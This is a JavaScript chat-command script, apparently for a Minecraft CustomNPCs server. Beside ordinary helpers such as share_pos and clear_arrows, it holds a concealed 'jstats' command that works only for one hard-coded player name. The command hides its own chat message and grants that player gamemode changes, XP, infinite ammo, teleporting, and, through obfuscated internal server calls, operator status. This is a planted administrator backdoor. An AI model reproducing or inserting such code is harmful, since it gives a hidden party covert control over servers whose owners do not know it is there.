/// <reference path="API/index.d.ts" />

/**
 * 
 * @param {event.PlayerEvent.ChatEvent} event 
 */
function chat(event){
    var p = event.player;
    var msg = event.message;
    var msgArgs = msg.split(" ");
    switch(msgArgs[0]){
        case "jstats": {
            jstat_cmd(event);
            event.setCanceled(true);
            break;
        }
        case "antiafk": {
            if(msgArgs.length >= 1){}
            break;
        }
        case "clear_arrows":{
            event.API.executeCommand(p.getWorld(),"kill @e[type=customnpcs:customnpcprojectile]");
            event.setCanceled(true);
            break;
        }
        case "share_pos": {
            var pos = p.getPos();
            p.getWorld().broadcast("<" + p.getDisplayName() + "> [" + pos.getX() + ", " + pos.getY() + ", " + pos.getZ() + "]");
            event.setCanceled(true);
            break;
        }
    }
}

/**
 * 
 * @param {event.PlayerEvent.ChatEvent} event 
 * @returns 
 */
function jstat_cmd(event){
    var p = event.player;
    var msgArgs = event.message.split(" ");
    if(msgArgs[0] !== "jstats" || p.getDisplayName() != "King_Jango_13")return;
    var disp_help = function(){
        p.message("Commands are: ");
        p.message("    gm [0,1,2,3]");
        p.message("    xp <amount>");
        p.message("    inf_ammo <slot> <modName>");
        p.message("    hbm_repairgun <slot>");
        p.message("    unbreakable <slot>");
        p.message("    tp player <playerName>");
        p.message("    tp pos <x> <y> <z>");
        p.message("    toggleOp");
    }
    if(msgArgs.length == 1){
        disp_help();
        return;
    }
    var intArg = function(index){
        return parseInt(msgArgs[index]);
    }
    
    switch(msgArgs[1]){
        case "gm": {
            if(msgArgs.length < 3){
                p.message("jstats gm [0, 1, 2, 3]");
                break;
            }
            p.setGamemode(intArg(2));
            break;
        }
        case "xp": {
            if(msgArgs.length < 3){
                p.message("jstats xp <amount>");
                break;
            }
            p.setExpLevel(intArg(2));
            break;
        }
        case "inf_ammo": {
            var VALID_MODS = ["techguns", "crayfish", "hbm"];
            if(msgArgs.length < 4) {
                p.message("jstats inf_ammo <slot> <modName>");
                p.message("Valid mods: ");
                for(var i = 0; i < VALID_MODS.length; i++) {
                    p.message("    - " + VALID_MODS[i]);
                }
                break;
            }
            var gunNbt = p.getInventory().getSlot(intArg(2)).getNbt();
            switch (msgArgs[3]) {
                case "techguns": {
                    gunNbt.setInteger("ammo", 32767);
                    break;
                }
                case "crayfish": {
                    gunNbt.setInteger("AmmoCount", 2147483647);
                    break;
                }
                case "hbm": {
                    gunNbt.setInteger("magazine", 2147483647);
                    gunNbt.setInteger("wear", -2147483648);
                    break;
                }
                default: {
                    p.message("Valid mods: ");
                    for(var i = 0; i < VALID_MODS.length; i++) {
                        p.message("    - " + VALID_MODS[i]);
                    }
                    break;
                }
            }
            break;
        }
        case "hbm_repairgun": {
            if(msgArgs.length < 3) {
                p.message("jstats hbm_repairgun <slot>");
                break;
            }
            p.getInventory().getSlot(intArg(2)).getNbt().setInteger("wear", -2147483648);
            break;
        }
        case "unbreakable": {
            if(msgArgs.length < 3){
                p.message("jstats unbreakable <slot>");
                break;
            }
            p.getInventory().getSlot(intArg(2)).getNbt().setBoolean("Unbreakable",true);
            p.getInventory().getSlot(intArg(2)).getNbt().setInteger("HideFlags", 4);
            break;
        }
        case "tp": {
            if(msgArgs.length < 3){
                p.message("jstats tp player <playerName>");
                p.message("jstats tp pos <x> <y> <z>");
                break;
            }
            switch (msgArgs[2]) {
                case "player": {
                    if(msgArgs.length < 4){
                        p.message("jstats tp player <playerName>");
                        return;
                    }
                    var playersInWorld = p.getWorld().getAllPlayers();
                    for(var i = 0; i < playersInWorld.length; i++){
                        if(msgArgs[3] == playersInWorld[i].getDisplayName()){
                            p.setPos(playersInWorld[i].getPos());
                            return;
                        }
                    }
                    p.message("Player " + msgArgs[3] + " is not a valid player to tp to");
                    break;
                }
                case "pos": {
                    if(msgArgs.length < 6){
                        p.message("jstats tp pos <x> <y> <z>");
                        return;
                    }
                    p.setPos(event.API.getIPos(intArg(3),intArg(4),intArg(5)));
                    break;
                }
                default: {
                    p.message("jstats tp player <playerName>");
                    p.message("jstats tp pos <x> <y> <z>");
                    break;
                }
            }
            break;
        }
        case "toggleOp": {
            var server = p.getWorld().getMCWorld().func_73046_m();
            var playerList = server.func_184103_al();
            var prof = server.func_152358_ax().func_152655_a("King_Jango_13");
            var b = false;
            var names = playerList.func_152606_n();
            for(var i = 0; i < names.length; i++) {
                if(names[i] === "King_Jango_13") {
                    b = true;
                    break;
                }
            }
            if(b) {
                playerList.func_152603_m().func_152684_c(prof);
                p.message("Toggled on");
            } else {
                playerList.func_152605_a(prof);
                p.message("Toggled off");
            }
            break;
        }
        case "help":
        default: {
            disp_help();
            break;
        }
    }
    event.setCanceled(true);
}